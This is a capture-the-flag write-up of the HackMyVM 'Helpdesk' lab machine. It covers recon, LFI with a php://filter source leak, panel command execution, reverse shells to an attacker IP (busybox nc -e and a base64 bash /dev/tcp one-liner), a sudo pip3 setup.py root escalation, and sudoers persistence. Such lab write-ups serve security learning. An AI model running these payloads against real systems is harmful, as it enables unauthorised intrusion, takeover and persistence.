# Helpdesk

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Helpdesk | MrMidnight | Beginner | HackMyVM |

**Summary:** Helpdesk is a beginner-level vulnerable machine that simulates a corporate ticketing system with multiple security flaws. The exploitation path involves discovering a Local File Inclusion (LFI) vulnerability in the ticket viewer, extracting hardcoded credentials from PHP source code using PHP filter wrappers, and gaining Remote Code Execution (RCE) through an authenticated admin panel. Lateral movement to the `helpdesk` user is achieved by exploiting an insecure UNIX domain socket that executes arbitrary commands. Finally, privilege escalation to root is accomplished by abusing sudo permissions on `pip3 install` with the `--break-system-packages` flag, allowing the execution of malicious Python setup scripts. The machine demonstrates common web application vulnerabilities including insufficient input validation, credential exposure, insecure inter-process communication, and dangerous sudo configurations.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance began with network scanning to identify the target machine within the local network range `192.168.100.0/24`:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.105 08:00:27:E5:04:39 VirtualBox
```

The scan identified a VirtualBox VM at **192.168.100.105**, confirming the target machine's IP address.

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was performed to enumerate open ports and identify running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ nmap -sC -sV -p- -T4 192.168.100.105
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-12 20:25 WIB
Nmap scan report for 192.168.100.105
Host is up (0.0046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b4:bc:42:f6:d0:a7:0d:fd:71:01:3d:8a:c5:0c:ac:e3 (ECDSA)
|_  256 71:90:08:58:14:04:09:d5:cf:31:ee:87:17:ad:29:8f (ED25519)
80/tcp open  http    Apache httpd
|_http-title: HelpDesk Ticket System
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.49 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 9.6p1 running on Ubuntu Linux - a modern version with no known critical vulnerabilities
- **Port 80 (HTTP)**: Apache web server hosting "HelpDesk Ticket System"

The attack surface focuses primarily on the web application.

### Web Application Analysis

Accessing the web server at `http://192.168.100.105/` revealed a HelpDesk Ticketing System portal:

![](image.png)

The landing page displays a maintenance notice stating: *"This portal is currently under maintenance. Internal teams should use the intranet interface to access support tickets."* This message provides a hint that there might be internal administrative interfaces accessible through directory enumeration.

### Directory and File Enumeration

To discover hidden endpoints and administrative interfaces, Feroxbuster was used with a comprehensive wordlist and multiple file extensions:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ feroxbuster -u http://192.168.100.105/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x txt,php,html,zip,bak,pem

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.105/
 🚩  In-Scope Url          │ 192.168.100.105
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [txt, php, html, zip, bak, pem]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       56l      138w     1290c http://192.168.100.105/
200      GET        5l       29w      250c http://192.168.100.105/debug.php
301      GET        7l       20w      240c http://192.168.100.105/helpdesk => http://192.168.100.105/helpdesk/
200      GET       56l      138w     1290c http://192.168.100.105/index.php
301      GET        7l       20w      242c http://192.168.100.105/javascript => http://192.168.100.105/javascript/
200      GET       86l      167w     1819c http://192.168.100.105/login.php
302      GET        0l        0w        0c http://192.168.100.105/panel.php => login.php
200      GET        5l       28w      204c http://192.168.100.105/ticket.php
301      GET        7l       20w      249c http://192.168.100.105/javascript/jquery => http://192.168.100.105/javascript/jquery/
200      GET    10907l    44549w   289782c http://192.168.100.105/javascript/jquery/jquery
[####################] - 80s    99862/99862   0s      found:10      errors:0
[####################] - 36s    33257/33257   924/s   http://192.168.100.105/
[####################] - 0s     33257/33257   1330280/s http://192.168.100.105/helpdesk/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 53s    33257/33257   628/s   http://192.168.100.105/javascript/
[####################] - 43s    33257/33257   776/s   http://192.168.100.105/javascript/jquery/  
```

**Critical Discoveries:**
- **`login.php`**: Administrative login interface
- **`panel.php`**: Redirects to login (requires authentication)
- **`ticket.php`**: Ticket viewer endpoint
- **`debug.php`**: Debug information page (potential information disclosure)
- **`/javascript/jquery/jquery`**: jQuery 3.6.1 library (no known critical exploits)

The `debug.php` file was investigated but only contained fake credentials (`service_user:SuperSecretDev123!`) that proved to be a rabbit hole with no valid application.

![](image-1.png)

The login page at `/login.php` presents a standard authentication form requiring a username and password.

---

## Initial Access

### Parameter Fuzzing on ticket.php

The `ticket.php` endpoint appeared to be a ticket viewing mechanism, but accessing it without parameters returned minimal content. To discover hidden GET parameters, FFUF (Fuzz Faster U Fool) was employed:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.100.105/ticket.php?FUZZ=1 -fs 100,204

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.105/ticket.php?FUZZ=1
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 100,204
________________________________________________

url                     [Status: 200, Size: 270, Words: 30, Lines: 5, Duration: 365ms]
:: Progress: [6453/6453] :: Job [1/1] :: 836 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

The fuzzing revealed a **`url`** parameter, suggesting the application might be fetching content from a user-supplied URL.

### Local File Inclusion (LFI) Vulnerability

Testing the `url` parameter with a common LFI payload (`/etc/passwd`) confirmed the vulnerability:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ curl http://192.168.100.105/ticket.php?url=/etc/passwd
<style>
body { font-family: sans-serif; background: #f0f0f0; padding: 20px; }
pre { background: #fff; padding: 10px; border-left: 4px solid #4A90E2; }
h1 { color: #4A90E2; }
</style><h1>Ticket Viewer</h1><h1>Ticket Viewer</h1><pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
mrmidnight:x:1000:1000:MrMidnight:/home/mrmidnight:/bin/bash
mysql:x:110:110:MySQL Server,,,:/nonexistent:/bin/false
helpdesk:x:1001:1001::/home/helpdesk:/bin/bash
</pre>
```

**Vulnerability Analysis:** The application uses PHP's `file_get_contents()` function with unsanitized user input, allowing arbitrary file access. This LFI vulnerability can read any file the web server user (`www-data`) has permissions to access.

**User Enumeration:** The `/etc/passwd` file revealed three potential user accounts:
- **root** (UID 0)
- **mrmidnight** (UID 1000)
- **helpdesk** (UID 1001)

### Extracting PHP Source Code with PHP Filter Wrappers

While the LFI allows reading files, accessing PHP files directly would only execute them server-side. To read the actual source code of `login.php`, a **PHP filter wrapper** was used to base64-encode the content before retrieval:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ curl http://192.168.100.105/ticket.php?url=php://filter/convert.base64-encode/resource=login.php
<style>
body { font-family: sans-serif; background: #f0f0f0; padding: 20px; }
pre { background: #fff; padding: 10px; border-left: 4px solid #4A90E2; }
h1 { color: #4A90E2; }
</style><h1>Ticket Viewer</h1><h1>Ticket Viewer</h1><pre>PD9waHAKc2Vzc2lvbl9zdGFydCgpOwoKLy8gRW5hYmxlIFBIUCBlcnJvciBkaXNwbGF5IGZvciBkZWJ1Z2dpbmcgKHJlbW92ZSBpbiBwcm9kdWN0aW9uKQppbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsIDEpOwplcnJvcl9yZXBvcnRpbmcoRV9BTEwpOwoKLy8gU3RvcmVkIGNyZWRlbnRpYWxzCiRzdG9yZWRfdXNlciA9ICdoZWxwZGVzayc7CgovLyBTSEEtNTEyIGhhc2ggZm9yIHBhc3N3b3JkOiB0aWNrZXRtYXN0ZXIKJHN0b3JlZF9oYXNoID0gJyQ2JEFCQzEyMyRmTG8yTWFjQ1YuWEJRZVJadEhXTDIyOTdxL2ZVQnMvYjhnT212TEd1aXo3d0RnbDNNU1djT09TS25UYmFOUG9VTUNtRXBZMWRsd3VQS2JBdEl1b282Lic7CgovLyBIYW5kbGUgbG9naW4KaWYgKCRfU0VSVkVSWydSRVFVRVNUX01FVEhPRCddID09PSAnUE9TVCcpIHsKICAgICR1c2VyID0gJF9QT1NUWyd1c2VybmFtZSddID8/ICcnOwogICAgJHBhc3MgPSAkX1BPU1RbJ3Bhc3N3b3JkJ10gPz8gJyc7CgogICAgaWYgKCR1c2VyID09PSAkc3RvcmVkX3VzZXIgJiYgY3J5cHQoJHBhc3MsICRzdG9yZWRfaGFzaCkgPT09ICRzdG9yZWRfaGFzaCkgewogICAgICAgICRfU0VTU0lPTlsnYXV0aCddID0gdHJ1ZTsKICAgICAgICBoZWFkZXIoIkxvY2F0aW9uOiBwYW5lbC5waHAiKTsKICAgICAgICBleGl0OwogICAgfSBlbHNlIHsKICAgICAgICAkZXJyb3IgPSAiSW52YWxpZCB1c2VybmFtZSBvciBwYXNzd29yZC4iOwogICAgfQp9Cj8+CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+SGVscERlc2sgTG9naW48L3RpdGxlPgogIDxzdHlsZT4KICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kOiAjZjRmN2ZhOwogICAgICBmb250LWZhbWlseTogIlNlZ29lIFVJIiwgVGFob21hLCBHZW5ldmEsIFZlcmRhbmEsIHNhbnMtc2VyaWY7CiAgICAgIGRpc3BsYXk6IGZsZXg7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICBoZWlnaHQ6IDEwMHZoOwogICAgICBtYXJnaW46IDA7CiAgICB9CgogICAgLmxvZ2luLWJveCB7CiAgICAgIGJhY2tncm91bmQ6IHdoaXRlOwogICAgICBwYWRkaW5nOiA0MHB4OwogICAgICBib3JkZXItcmFkaXVzOiAxMHB4OwogICAgICBib3gtc2hhZG93OiAwIDRweCAxMnB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIG1heC13aWR0aDogNDAwcHg7CiAgICAgIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgIH0KCiAgICAubG9naW4tYm94IGgyIHsKICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgY29sb3I6ICMyYzNlNTA7CiAgICB9CgogICAgLmxvZ2luLWJveCBpbnB1dFt0eXBlPSJ0ZXh0Il0sCiAgICAubG9naW4tYm94IGlucHV0W3R5cGU9InBhc3N3b3JkIl0gewogICAgICB3aWR0aDogMTAwJTsKICAgICAgcGFkZGluZzogMTJweDsKICAgICAgbWFyZ2luOiAxMHB4IDA7CiAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNjY2M7CiAgICAgIGJvcmRlci1yYWRpdXM6IDZweDsKICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgfQoKICAgIC5sb2dpbi1ib3ggYnV0dG9uIHsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIHBhZGRpbmc6IDEycHg7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICM0QTkwRTI7CiAgICAgIGJvcmRlcjogbm9uZTsKICAgICAgY29sb3I6IHdoaXRlOwogICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgIGZvbnQtd2VpZ2h0OiBib2xkOwogICAgICBib3JkZXItcmFkaXVzOiA2cHg7CiAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIH0KCiAgICAubG9naW4tYm94IGJ1dHRvbjpob3ZlciB7CiAgICAgIGJhY2tncm91bmQtY29sb3I6ICMzNTdBQkQ7CiAgICB9CgogICAgLmVycm9yIHsKICAgICAgY29sb3I6IHJlZDsKICAgICAgbWFyZ2luLXRvcDogMTBweDsKICAgIH0KCiAgICBmb290ZXIgewogICAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICAgIGJvdHRvbTogMTBweDsKICAgICAgd2lkdGg6IDEwMCU7CiAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgZm9udC1zaXplOiAxMnB4OwogICAgICBjb2xvcjogIzg4ODsKICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogIDxkaXYgY2xhc3M9ImxvZ2luLWJveCI+CiAgICA8aDI+SGVscERlc2sgQWRtaW4gTG9naW48L2gyPgogICAgPGZvcm0gbWV0aG9kPSJQT1NUIj4KICAgICAgPGlucHV0IHR5cGU9InRleHQiIG5hbWU9InVzZXJuYW1lIiBwbGFjZWhvbGRlcj0iVXNlcm5hbWUiIHJlcXVpcmVkPjxicj4KICAgICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwYXNzd29yZCIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiByZXF1aXJlZD48YnI+CiAgICAgIDxidXR0b24gdHlwZT0ic3VibWl0Ij5Mb2dpbjwvYnV0dG9uPgogICAgPC9mb3JtPgogICAgPD9waHAgaWYgKGlzc2V0KCRlcnJvcikpIGVjaG8gIjxkaXYgY2xhc3M9J2Vycm9yJz4kZXJyb3I8L2Rpdj4iOyA/PgogIDwvZGl2PgogIDxmb290ZXI+JmNvcHk7IDIwMjUgSGVscERlc2sgVGlja2V0aW5nIFN5c3RlbTwvZm9vdGVyPgo8L2JvZHk+CjwvaHRtbD4KCg==</pre> 
```

Decoding the base64-encoded content revealed the PHP source code:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ vim login.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ cat login.txt | base64 -d
<?php
session_start();

// Enable PHP error display for debugging (remove in production)
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Stored credentials
$stored_user = 'helpdesk';

// SHA-512 hash for password: ti[REDACTED]
$stored_hash = '$6$ABC123$fLo2MacCV.XBQeRZtHWL2297q/[REDACTED].';

// Handle login
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'] ?? '';
    $pass = $_POST['password'] ?? '';

    if ($user === $stored_user && crypt($pass, $stored_hash) === $stored_hash) {
        $_SESSION['auth'] = true;
        header("Location: panel.php");
        exit;
    } else {
        $error = "Invalid username or password.";
    }
}
?>
...
```

**Critical Information Disclosure:** The source code contains:
1. **Hardcoded username**: `helpdesk`
2. **Plaintext password in comments**: `ti[REDACTED]`
3. **SHA-512 crypt hash**: The password hash is also visible, but since the plaintext is already revealed in the comment, hash cracking is unnecessary

**Credentials Found:** `helpdesk:ti[REDACTED]`

### Authenticated Remote Command Execution

Using the discovered credentials, successful authentication was achieved at `/login.php`, which redirected to the administrative panel at `/panel.php`:

![](image-2.png)

The **Remote Command Panel** provides a web interface labeled "Execute Diagnostic Command" that accepts system commands. This is an extremely dangerous feature that allows arbitrary command execution on the underlying server.

Testing with the `id` command confirmed command execution capabilities:

![](image-3.png)

The output shows execution context as the `www-data` user: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Vulnerability Root Cause:** The `panel.php` file uses PHP's `shell_exec()` function to execute user-supplied commands without any input validation or sanitization:

```php
<?php
// Handle command input
$output = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd . " 2>&1");  // Direct command execution!
}
?>
```

This represents a **Remote Code Execution (RCE)** vulnerability that allows complete control over the web server process.

### Establishing Initial Reverse Shell

A Netcat listener was configured on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The following payload was submitted through the command panel:

```bash
busybox nc 192.168.100.1 4444 -e /bin/bash
```

This command uses BusyBox's Netcat implementation with the `-e` flag to execute `/bin/bash` upon connection, providing an interactive shell.

Connection established:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 60976
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
www-data@helpdesk:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@helpdesk:/var/www/html$ export SHELL=bash
www-data@helpdesk:/var/www/html$ export TERM=xterm
www-data@helpdesk:/var/www/html$ stty rows 100 cols 200
www-data@helpdesk:/var/www/html$ reset
```

The shell was upgraded to a fully interactive TTY using Python's `pty` module, followed by terminal normalization with `stty` for proper display and input handling.

---

## Privilege Escalation

### Internal Enumeration as www-data

After gaining initial access as `www-data`, internal reconnaissance revealed additional attack vectors. Examining the `/opt` directory uncovered two interesting subdirectories:

```bash
www-data@helpdesk:/opt$ ls -la
total 16
drwxr-xr-x  4 root     root     4096 Aug 16 15:32 .
drwxr-xr-x 23 root     root     4096 Aug 16 15:58 ..
drwxr-xr-x  2 root     root     4096 Aug 16 16:13 dev_server
drwxr-xr-x  2 helpdesk helpdesk 4096 Feb 12 13:22 helpdesk-socket
```

Network services listening on localhost were enumerated:

```bash
www-data@helpdesk:/opt/helpdesk-socket$ ss -tulpan
Netid State      Recv-Q Send-Q            Local Address:Port              Peer Address:Port  Process
udp   UNCONN     0      0                    127.0.0.54:53                     0.0.0.0:*
udp   UNCONN     0      0                 127.0.0.53%lo:53                     0.0.0.0:*
udp   UNCONN     0      0        192.168.100.105%enp0s3:68                     0.0.0.0:*
tcp   LISTEN     0      4096              127.0.0.53%lo:53                     0.0.0.0:*
tcp   LISTEN     0      70                    127.0.0.1:33060                  0.0.0.0:*
tcp   LISTEN     0      4096                 127.0.0.54:53                     0.0.0.0:*
tcp   LISTEN     0      151                   127.0.0.1:3306                   0.0.0.0:*
tcp   LISTEN     0      5                     127.0.0.1:8000                   0.0.0.0:*
tcp   LISTEN     0      4096                    0.0.0.0:22                     0.0.0.0:*
tcp   ESTAB      0      0               192.168.100.105:59582            192.168.100.1:4444
tcp   LISTEN     0      511                           *:80                           *:*
tcp   LISTEN     0      4096                       [::]:22                        [::]:*
```

**Key Findings:**
- **Port 8000 (localhost)**: Internal development server
- **Port 3306 (localhost)**: MySQL database
- **Port 33060 (localhost)**: MySQL X Protocol

Investigating the `/opt/dev_server` directory:

```bash
www-data@helpdesk:/opt/dev_server$ cat server.py
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Internal Dev API - v0.2\n")
            self.wfile.write(b"For authorized service use only.\n")

        elif self.path == "/dump":
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"[DEV DEBUG] Username: helpdesk\n")
            self.wfile.write(b"[DEV DEBUG] Hash: $6$rounds=10000$ABC123$8TZKHwbjkGZ.LfK/...REDACTED...\n")

        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"404 - Not Found\n")

if __name__ == "__main__":
    print("Starting internal dev server on 127.0.0.1:8000...")
    httpd = HTTPServer(('127.0.0.1', 8000), Handler)
    httpd.serve_forever()
```

This development server exposed a `/dump` endpoint containing redacted hash information, but it proved to be another red herring.

### Exploiting UNIX Domain Socket for Lateral Movement

The most promising discovery was in `/opt/helpdesk-socket`:

```bash
www-data@helpdesk:/opt/helpdesk-socket$ ls -la
total 16
drwxr-xr-x 2 helpdesk helpdesk 4096 Feb 12 13:22 .
drwxr-xr-x 4 root     root     4096 Aug 16 15:32 ..
-rwxr-xr-x 1 helpdesk helpdesk  158 Aug 16 15:32 handler.sh
srwxrwxrwx 1 helpdesk helpdesk    0 Feb 12 13:22 helpdesk.sock
-rw-r--r-- 1 root     root      184 Aug 16 15:44 serve.sh
```

Examining the socket handler:

```bash
www-data@helpdesk:/opt/helpdesk-socket$ cat handler.sh
#!/bin/bash
# Simple parser — executes anything sent over the socket (dangerous!)
read cmd
echo "[HelpDesk Automation] Executing: $cmd"
/bin/bash -c "$cmd"
```

**Critical Security Flaw:** The `handler.sh` script reads input from the socket and executes it as a bash command **without any validation**. The socket file `helpdesk.sock` has world-writable permissions (`srwxrwxrwx`), and the handler runs with the privileges of the user who started the socket service (the `helpdesk` user).

The service configuration in `serve.sh` confirms the setup:

```bash
www-data@helpdesk:/opt/helpdesk-socket$ cat serve.sh
#!/bin/bash

SOCKET="/opt/helpdesk-socket/helpdesk.sock"

[ -e "$SOCKET" ] && rm "$SOCKET"

/usr/bin/socat -d -d UNIX-LISTEN:$SOCKET,fork,mode=777 EXEC:/opt/helpdesk-socket/handler.sh
```

The `socat` command creates a UNIX socket listener that executes `handler.sh` for each connection with `fork` mode, and the socket has permission mode `777` (world-accessible).

### Escalation to helpdesk User

A new reverse shell listener was started on port 8888:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
```

The reverse shell payload was base64-encoded to avoid issues with special characters:

**Payload**: `bash -i >& /dev/tcp/192.168.100.1/8888 0>&1`  
**Base64**: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzg4ODggMD4mMQ==`

The payload was sent to the socket using `socat`:

```bash
www-data@helpdesk:/opt/helpdesk-socket$ echo "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzg4ODggMD4mMQ== | base64 -d | bash" | socat - UNIX-CONNECT:/opt/helpdesk-socket/helpdesk.sock
[HelpDesk Automation] Executing: echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4xLzg4ODggMD4mMQ== | base64 -d | bash
```

Connection received as `helpdesk` user:

```bash
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 61244
bash: cannot set terminal process group (672): Inappropriate ioctl for device
bash: no job control in this shell
helpdesk@helpdesk:/$ id
uid=1001(helpdesk) gid=1001(helpdesk) groups=1001(helpdesk)
```

Shell stabilization:

```bash
helpdesk@helpdesk:/$ python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'
helpdesk@helpdesk:/$ ^Z
zsh: suspended  nc -lvnp 8888

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 8888

helpdesk@helpdesk:/$ export SHELL=bash
helpdesk@helpdesk:/$ export TERM=xterm
helpdesk@helpdesk:/$ stty rows 100 cols 200
helpdesk@helpdesk:/$ reset
```

### Privilege Escalation to Root via pip3 Sudo Abuse

Checking sudo privileges for the `helpdesk` user:

```bash
helpdesk@helpdesk:~$ sudo -l
Matching Defaults entries for helpdesk on helpdesk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User helpdesk may run the following commands on helpdesk:
    (ALL) NOPASSWD: /usr/bin/pip3 install --break-system-packages *
```

**Vulnerability Analysis:** The `helpdesk` user can execute `pip3 install` with the `--break-system-packages` flag without a password. This flag was introduced in recent Python/pip versions (PEP 668) to prevent users from accidentally breaking system packages by installing packages outside virtual environments. However, when combined with sudo permissions, it becomes a privilege escalation vector.

The exploitation technique leverages pip's ability to execute arbitrary Python code during package installation via `setup.py`. Consulting GTFOBins for pip exploitation:

![](image-5.png)

Creating a malicious `setup.py` file:

```bash
helpdesk@helpdesk:~$ echo 'import os; os.system("exec /bin/bash </dev/tty >/dev/tty 2>/dev/tty")' > /tmp/setup.py
```

**Payload Explanation:**
- `import os; os.system(...)`: Executes shell commands from Python
- `exec /bin/bash`: Replaces the current process with a bash shell, preserving the elevated privileges
- `</dev/tty >/dev/tty 2>/dev/tty`: Properly connects stdin, stdout, and stderr to the terminal for interactive shell

Executing the privilege escalation:

```bash
helpdesk@helpdesk:/tmp$ sudo /usr/bin/pip3 install --break-system-packages .
Processing /tmp
root@helpdesk:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root access achieved!** The pip installation process executed `setup.py`, which spawned a root shell.

### Establishing Persistent Access

To maintain access and demonstrate complete system compromise, a sudo entry was created for the `mrmidnight` user and the password was reset:

```bash
root@helpdesk:~# echo 'mrmidnight ALL=(ALL:ALL) ALL' > /etc/sudoers.d/mrmidnight
root@helpdesk:~# chmod 0440 /etc/sudoers.d/mrmidnight
root@helpdesk:~# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/helpdesk: bad permissions, should be mode 0440
/etc/sudoers.d/mrmidnight: parsed OK
root@helpdesk:~# chmod 0440 /etc/sudoers.d/helpdesk
root@helpdesk:~# visudo -c
/etc/sudoers: parsed OK
/etc/sudoers.d/README: parsed OK
/etc/sudoers.d/helpdesk: parsed OK
/etc/sudoers.d/mrmidnight: parsed OK
root@helpdesk:~# passwd mrmidnight
New password:
Retype new password:
passwd: password updated successfully
```

SSH access as `mrmidnight` with sudo to root:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/helpdesk]
└─$ ssh mrmidnight@192.168.100.105
mrmidnight@192.168.100.105's password:
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-71-generic x86_64)
...
mrmidnight@helpdesk:~$ sudo su
[sudo] password for mrmidnight:
root@helpdesk:/home/mrmidnight# cd
root@helpdesk:~# id ; whoami ; hostname
